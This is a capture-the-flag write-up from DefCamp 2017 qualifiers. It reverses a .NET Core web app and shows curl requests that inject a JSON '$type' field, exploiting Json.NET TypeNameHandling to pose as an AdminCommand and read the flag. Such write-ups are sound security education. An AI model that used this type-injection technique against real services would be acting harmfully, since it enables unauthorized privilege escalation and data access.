---
layout: post
title: "[DefCamp CTF Qualification 2017] Don't net, kids! (Revexp 400)"
date: 2017-10-01 11:00:00
share: true
comments: true
description: Writeup for Don't net, kids! 
tags: [DefCamp CTF Qualifications 2017, .Net Reversing]
---

## Don't net, kids!

You're provided with a [big zip file](http://ccsir.org/files/dotnot.zip) that contains mostly dot net libraries and a few challenge specific ones. Since the name of the challenge hints to be a .Net reversing challenge I focused on DCTFNetCoreWebApp.dll.

I used dotPeek to decompile it and found the following:

1. `DCTFNetCoreWebApp`: Mostly some logic to get the webapp running.
2. `DCTFNetCoreWebApp.Business`: Contains the API logic (the Executor class). This contains the allowed actions as well (Notice how getflag is considered an AdminCommand).
3. `DCTFNetCoreWebApp.Controllers`: Parser for GET/POST requests revealing the route (/api/command)

    ```console
    abatchy@ubuntu:~/Desktop$ curl https://dotnot.dctf-quals-17.def.camp/api/command
    Hi! Nothing here :)
    ```

4. `DCTFNetCoreWebApp.Models`: Models defining the command layout which we'll need to communicate with the API.


The meat of the code is the `Execute` method:

```csharp
public Command Execute(Command command)
{
  // Need to be authenticated
  if (this._guestActions.Contains(command.Action.ToLower()))
    return this.Authenticate(command);
  if (!this.IsAuthenticated(command))
    throw new Exception("Authentication required!");
  // Is the command of type AdminCommand?
  bool flag = ((MemberInfo) command.GetType()).get_Name().Equals(((MemberInfo) typeof (AdminCommand)).get_Name());
  if (this._adminActions.Contains(command.Action.ToLower()) && !flag)
    throw new Exception("Command not allowed!");
  if (!this._userActions.Contains(command.Action.ToLower()) && !flag)
    throw new Exception("Invalid action");
  string lower = command.Action.ToLower();
  if (lower == "get")
    return this.Get(command);
  if (lower == "set")
    return this.Set(command);
  if (lower == "list")
    return this.List(command);
  if (lower == "readflag")
    return this.ReadFlag(command);
  throw new Exception("Command not implemented!");
}
```

1. You need to be authenticated.
2. Command needs to be of `AdminCommand` type (inherited).

Let's try first just contacting the API with a command. Parser for POST:

```csharp
[HttpPost]
public string Post()
{
  if (((ControllerBase) this).get_Request().get_Body().get_CanSeek())
    ((ControllerBase) this).get_Request().get_Body().set_Position(0L);
  string end = ((TextReader) new StreamReader(((ControllerBase) this).get_Request().get_Body())).ReadToEnd();
  Console.WriteLine(end);
  try
  {
    string str1 = end;
    JsonSerializerSettings serializerSettings = new JsonSerializerSettings();
    int num = 4;
    serializerSettings.set_TypeNameHandling((TypeNameHandling) num);
    string str2 = JsonConvert.SerializeObject((object) this._executor.Execute(((Request) JsonConvert.DeserializeObject<Request>(str1, serializerSettings)).Command));
    Console.WriteLine(str2);
    return str2;
  }
  catch (Exception ex)
  {
    Console.WriteLine(ex.Message);
    return ex.Message;
  }
}
```

Few notes:
1. Data provided is parsed to a Command object found in models.
2. [TypeNameHandling](https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm) is set to Auto, which we need later.


### 1. Authenticate: 

```console
abatchy@ubuntu:~/Desktop$ curl -X POST -H "Content-Type: application/json" -d '{"Command":{ "Action": "authenticate" } }' https://dotnot.dctf-quals-17.def.camp/api/command

{"UserId":"da268d19-b985-4779-bbdf-736ee4ec9b32","Action":"authenticate","Query":null,"Value":null,"Response":null,"Error":null}
```

From now on we'll be using the GUID provided.

### 2. Readflag

```console
abatchy@ubuntu:~/Desktop$ curl -X POST -H "Content-Type: application/json" -d '{"Command":{"UserId":"da268d19-b985-4779-bbdf-736ee4ec9b32", "Action":"Readflag" } }' https://dotnot.dctf-quals-17.def.camp/api/command

Command not allowed!
```

So unfortunately this command fails as the `flag` is set to false. We need to cast the JSON to an AdminCommand using `$type` field.

I tried setting it to `DCTFNetCoreWebApp.Models.AdminCommand` but it returned an error message.

```console
abatchy@ubuntu:~/Desktop$ curl -X POST -H "Content-Type: application/json" -d '{"$type":"DCTFNetCoreWebApp.Models.AdminCommand", "Command":{"UserId":"da268d19-b985-4779-bbdf-736ee4ec9b32", "Action":"Readflag" } }' https://dotnot.dctf-quals-17.def.camp/api/command

Type specified in JSON 'DCTFNetCoreWebApp.Models.AdminCommand' was not resolved. Path '$type', line 1, position 48.
```

Then I thought of casting it to a known class that definitely exists, maybe the error shows any data.

```console
abatchy@ubuntu:~/Desktop$ curl -X POST -H "Content-Type: application/json" -d '{"Command":{"$type":"System.Guid", "UserId":"da268d19-b985-4779-bbdf-736ee4ec9b32", "Action":"Readflag" } }' https://dotnot.dctf-quals-17.def.camp/api/command

Type specified in JSON 'System.Guid, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e' is not compatible with 'DCTFNetCoreWebApp.Models.Command, DCTFNetCoreWebApp, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'. Path 'Command.$type', line 1, position 33.
```

Nice! We got the full type to use, replace Request with AdminCommand and we're good to go.

```console
abatchy@ubuntu:~/Desktop$ curl -X POST -H "Content-Type: application/json" -d '{"Command":{"$type":"DCTFNetCoreWebApp.Models.AdminCommand, DCTFNetCoreWebApp, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null", "UserId":"da268d19-b985-4779-bbdf-736ee4ec9b32", "Action":"Readflag" } }' https://dotnot.dctf-quals-17.def.camp/api/command

{"UserId":"da268d19-b985-4779-bbdf-736ee4ec9b32","Action":"Readflag","Query":null,"Value":null,"Response":"DCTF{4e388d989d6e9cfd2ba8a0ddf0f870c23c4936fabfc5c271d065a467af96e387}\n","Error":null}
```

The flag is `DCTF{4e388d989d6e9cfd2ba8a0ddf0f870c23c4936fabfc5c271d065a467af96e387}`.

\- Abatchy